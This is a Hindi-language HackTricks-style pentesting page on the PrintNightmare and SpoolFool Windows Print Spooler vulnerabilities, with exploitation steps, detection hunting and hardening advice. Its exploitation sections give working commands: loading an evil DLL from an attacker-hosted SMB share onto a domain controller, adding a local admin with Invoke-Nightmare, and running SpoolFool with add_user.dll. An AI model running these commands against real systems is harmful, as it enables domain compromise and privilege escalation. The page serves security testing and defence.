# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare Windows **Print Spooler** service में मौजूद vulnerabilities के एक समूह का सामूहिक नाम है, जो **SYSTEM के रूप में arbitrary code execution** और, जब spooler RPC के माध्यम से reachable हो, **domain controllers और file servers पर remote code execution (RCE)** की अनुमति देता है। सबसे अधिक exploit किए गए CVEs हैं **CVE-2021-1675** (शुरुआत में LPE के रूप में वर्गीकृत) और **CVE-2021-34527** (पूर्ण RCE)। बाद के issues जैसे **CVE-2021-34481 (“Point & Print”)** और **CVE-2022-21999 (“SpoolFool”)** साबित करते हैं कि attack surface अभी भी पूरी तरह बंद नहीं हुआ है।

यदि आप **driver-based RCE/LPE** के बजाय spooler के माध्यम से **authentication coercion / relay** खोज रहे हैं, तो [printer coercion abuse के बारे में यह अन्य पेज देखें](printers-spooler-service-abuse.md)। यह पेज **SYSTEM के रूप में drivers / DLLs load करने** पर केंद्रित है।

---

## 1. Vulnerable components & CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|जून 2021 CU में patched किया गया, लेकिन CVE-2021-34527 द्वारा bypass कर दिया गया|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` authenticated users को remote share से driver DLL load करने की अनुमति देता है; अगस्त 2021 के बाद इसके लिए आमतौर पर कमजोर Point & Print policies आवश्यक होती हैं|
|2021|CVE-2021-34481|“Point & Print”|LPE|non-admin users द्वारा unsigned driver installation|
|2022|CVE-2022-21999|“SpoolFool”|LPE|arbitrary directory creation → DLL planting – 2021 patches के बाद भी काम करता है|

इन सभी में **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) में से किसी एक का abuse किया जाता है या **Point & Print** के अंदर मौजूद trust relationships का दुरुपयोग किया जाता है।

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

एक authenticated लेकिन **non-privileged** domain user किसी remote spooler (अक्सर DC) पर arbitrary DLLs को **NT AUTHORITY\SYSTEM** के रूप में चला सकता है, इसके लिए:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Popular PoCs में **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) और **mimikatz** में Benjamin Delpy के `misc::printnightmare / lsa::addsid` modules शामिल हैं।

### 2.2 Local privilege escalation (any supported Windows, 2021-2024)

उसी API को **locally** call करके `C:\Windows\System32\spool\drivers\x64\3\` से driver load किया जा सकता है और SYSTEM privileges प्राप्त की जा सकती हैं:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Patched hosts पर modern triage

पूरी तरह updated host पर, public PrintNightmare PoCs अक्सर fail हो जाते हैं क्योंकि Windows अब default रूप से **administrator-only** printer driver installation का उपयोग करता है (`RestrictDriverInstallationToAdministrators=1`, 10 अगस्त 2021 से)। किसी target पर exploit चलाने से पहले, पहले जांचें कि क्या environment ने legacy printer deployments के लिए उस safety change को वापस roll back किया है:
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
दो सबसे महत्वपूर्ण कमजोर values आमतौर पर ये होती हैं:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Linux से, PoC चलाने से पहले जल्दी से पुष्टि करें कि target संबंधित print RPC interfaces expose करता है:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
कुछ नए public tooling DLL भेजने से पहले एक अधिक सुरक्षित **check/list** workflow भी देते हैं:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> यदि आपको कम-अधिकार वाले user के रूप में `RPC_E_ACCESS_DENIED` (`0x8001011b`) मिलता है, तो आमतौर पर आप transport failure के बजाय 2021 के बाद वाला default देख रहे होते हैं।

> Windows 11 22H2+ और नए client builds पर, remote printing का default **RPC over TCP** है और **RPC over named pipes** (`\PIPE\spoolss`) तब तक disabled रहता है जब तक इसे explicitly re-enable न किया जाए। कुछ पुराने PoCs और lab notes अब भी मानते हैं कि named pipe reachable है।

### 2.4 “patched” networks पर Package Point & Print abuse

कई enterprise environments original 2021 patches के बाद भी policy के कारण **vulnerable** बने रहे, क्योंकि helpdesk या print-server workflows में non-admin users को drivers install/update करने की आवश्यकता बनी रही। व्यवहार में, offensive playbook इस प्रकार बनता है:

- यदि security prompts पूरी तरह disabled हैं, तो **classic arbitrary-DLL PrintNightmare** अब भी सबसे छोटा रास्ता है।
- यदि `Only use Package Point and Print` enabled है, तो आमतौर पर raw DLL drop के बजाय **signed package-aware driver** path पर pivot करना पड़ता है।
- 2024 research ने दिखाया कि **`Package Point and Print - Approved servers` अपने-आप में hard trust boundary नहीं है**: यदि attacker किसी approved print server के लिए name resolution को spoof या hijack कर सकता है, तो victims को policy checks पूरा करने वाले malicious server पर redirect किया जा सकता है।
- UNC hardening को forced RPC-over-SMB के साथ combine करने पर भी स्थिति brittle हो सकती है, क्योंकि modern clients **RPC over TCP** पर fallback कर सकते हैं।

इसीलिए modern PrintNightmare-style exploitation अक्सर original 2021 PoC को बिना बदलाव के replay करने के बजाय **enterprise printer deployment policy का abuse** करने पर अधिक निर्भर करता है।

### 2.5 SpoolFool (CVE-2022-21999) – 2021 fixes को bypass करना

Microsoft के 2021 patches ने remote driver loading को block किया, लेकिन **directory permissions को harden नहीं किया**। SpoolFool `SpoolDirectory` parameter का abuse करके `C:\Windows\System32\spool\drivers\` के अंतर्गत एक arbitrary directory बनाता है, payload DLL drop करता है और spooler को उसे load करने के लिए force करता है:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> यह exploit February 2022 updates से पहले पूरी तरह patched Windows 7 → Windows 11 और Server 2012R2 → 2022 पर काम करता है

---

## 3. Detection और hunting

* **PrintService logs** – *Microsoft-Windows-PrintService/Operational* channel को enable करें और **Event ID 316** (driver जोड़ा/updated, जिसमें आमतौर पर DLL names शामिल होते हैं) पर नज़र रखें, सफल और विफल दोनों attempts के लिए। इसे suspicious spooler module/driver load failures के लिए **Event ID 808/811** के साथ मिलाकर देखें।
* **Sysmon** – `Event ID 7` (Image loaded) या `11/23` (File write/delete), `C:\Windows\System32\spool\drivers\*` के अंदर, जब parent process **spoolsv.exe** हो।
* **Process lineage** – जब भी **spoolsv.exe**, `cmd.exe`, `rundll32.exe`, PowerShell या किसी unexpected unsigned child process को spawn करे, alert करें।
* **Network telemetry** – **spoolsv.exe** से attacker-controlled shares पर होने वाले unexpected SMB fetches या उन servers से unusual printer RPC traffic, जिन्हें print servers की तरह व्यवहार नहीं करना चाहिए, दोनों high-signal leads हैं।

## 4. Mitigation और hardening

1. **Patch करें!** – हर उस Windows host पर latest cumulative update लागू करें, जिस पर Print Spooler service installed है।
2. **जहाँ आवश्यक न हो, वहाँ spooler को disable करें**, विशेष रूप से Domain Controllers पर:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Local printing की अनुमति रखते हुए remote connections को block करें** – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Point & Print को केवल admins तक सीमित रखें**:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Microsoft KB5005652 में विस्तृत guidance दी गई है।
5. यदि business requirements के कारण `RestrictDriverInstallationToAdministrators=0` रखना आवश्यक हो, तो हर दूसरी printer policy को केवल **partial mitigation** मानें। कम से कम **package-aware drivers** को प्राथमिकता दें, **Only use Package Point and Print** enable करें, और **Package Point and Print - Approved servers** को स्पष्ट in-forest print servers तक सीमित रखें।
6. Broken printer mappings को ठीक करने के लिए **printer RPC privacy को rollback न करें**। `RpcAuthnLevelPrivacyEnabled=0` सेट करने वाले environments, **CVE-2021-1678** के लिए जोड़ी गई hardening को undo कर रहे हैं और engagement के दौरान आमतौर पर अतिरिक्त scrutiny के योग्य होते हैं।

---

## 5. Related research / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – `-check`, `-list`, और `-delete` modes वाला standard Impacket implementation
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – built-in SMB delivery, multi-target support, और `MS-RPRN` / `MS-PAR` दोनों modes वाला wrapper
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – package Point & Print के माध्यम से bring-your-own-vulnerable-printer-driver abuse
* SpoolFool exploit और write-up
* SpoolFool और अन्य spooler bugs के लिए 0patch micropatches

यदि आप driver load करने के बजाय spooler के माध्यम से **coerce authentication** करना चाहते हैं, तो [printer spooler service abuse](printers-spooler-service-abuse.md) पर जाएँ।

---

## References

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *A Practical Guide to PrintNightmare in 2024*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *The PrintNightmare is not Over Yet*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
